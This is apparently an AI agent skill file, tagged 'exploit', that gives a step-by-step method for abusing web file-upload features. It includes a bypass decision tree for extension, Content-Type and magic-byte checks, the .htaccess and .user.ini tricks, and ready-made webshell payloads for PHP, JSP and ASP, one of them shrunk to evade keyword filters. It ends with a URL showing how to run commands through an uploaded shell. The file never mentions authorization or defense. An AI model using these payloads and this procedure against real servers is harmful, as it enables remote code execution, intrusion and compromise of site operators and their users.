---
name: file-upload-methodology
description: "Detection, bypass, and exploitation of arbitrary file upload. Use when the target has an upload feature (avatar, attachment, import), multipart forms, or a file management interface. Includes three-layer bypass (extension / Content-Type / magic bytes), .htaccess overwriting, .user.ini + auto_prepend_file, image shell secondary rendering bypass, ZIP extraction exploitation, and upload path guessing methods"
zh-signals: "检测并绕过任意文件上传限制，实现 webshell 上传与利用。信号:文件上传,webshell,绕过,multipart,头像上传,rce"
when-to-use: >-
  Use when the target exposes an upload feature such as avatar, attachment, or import
  endpoints, or a multipart form, and you need to bypass extension, Content-Type, or
  magic-byte filters.
metadata:
  tags: "arbitrary_file_upload,file upload,webshell,bypass,path-traversal,rce,upload,multipart,Content-Type-bypass,double-extension,MIME,file-upload,avatar,avatar-upload,attachment,attachment-upload,import,import-file,image upload"
  category: "exploit"
---

# File Upload Vulnerability Methodology

## ⛔ Further Reading (Must Read)

- Extension / Content-Type / magic byte bypass details, path traversal, .htaccess overwriting, .user.ini exploitation, image shell secondary rendering bypass, ZIP extraction exploitation → [references/upload-bypass.md](references/upload-bypass.md)

---

## Phase 0: Upload Feature Discovery and Analysis (do this first!)

1. Look for `<form enctype="multipart/form-data">` or `<input type="file">`
2. Common endpoints: `/upload`, `/api/upload`, `/avatar`, `/import`
3. **Key collection**: allowed file types, storage path after upload, server tech stack (PHP/Java/Python)

**Trap**: client-side JavaScript validation can be bypassed directly; the real restriction is on the backend.

## Phase 1: Basic Upload Test

1. First upload a normal file (.txt) to confirm the function works, and **record the returned file path**
2. Access the URL of the uploaded file — confirm it is reachable
3. Upload a .php file and observe whether it is rejected

**Path guessing**: `/uploads/`, `/upload/`, `/files/`, `/static/uploads/`, `/images/`

## Phase 2: Bypass Decision Tree

```
Upload rejected?
├─ Extension restriction (blacklist) → .phtml/.php5/case variation/.php./double extension → [references/upload-bypass.md](references/upload-bypass.md)
├─ Extension restriction (whitelist) → .htaccess overwriting (Apache) or .user.ini (universal) → [references/upload-bypass.md](references/upload-bypass.md)
├─ Content-Type restriction → change to image/jpeg
├─ File header check → GIF89a + webshell
├─ Secondary rendering check → image shell (GIF preferred) → [references/upload-bypass.md](references/upload-bypass.md)
└─ All three layers restricted → combined bypass: extension + Content-Type + file header
```

## Phase 3: Webshell Payload

**PHP** (most common):
```php
<?php system($_GET['cmd']); ?>
```
Slim version (bypasses keyword filters): `<?=`$_GET[1]`?>`

**JSP**: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
**ASP**: `<%eval request("cmd")%>`

### Post-Upload Verification
```
http://target/uploads/shell.php?cmd=id
```
**Trap**: accessing the .php returns the source code → that directory forbids execution, so you need path traversal or .htaccess.

## Notes
- **Upload success ≠ exploitable**: you must access the file to verify execution
- **The server may hash and rename files**: get the new filename from the response
- **Record the extension and response for every attempt**: quickly rule out ineffective bypasses

## .htaccess Attack
- Two-step method: first upload a .htaccess that configures PHP parsing rules, then upload shell.jpg

## Upload ≠ Execution
- A successful upload does not mean it is exploitable (upload ≠ execution); you must confirm the file can be accessed and parsed
- Combine with file inclusion (LFI) and other vulnerabilities to execute the uploaded webshell
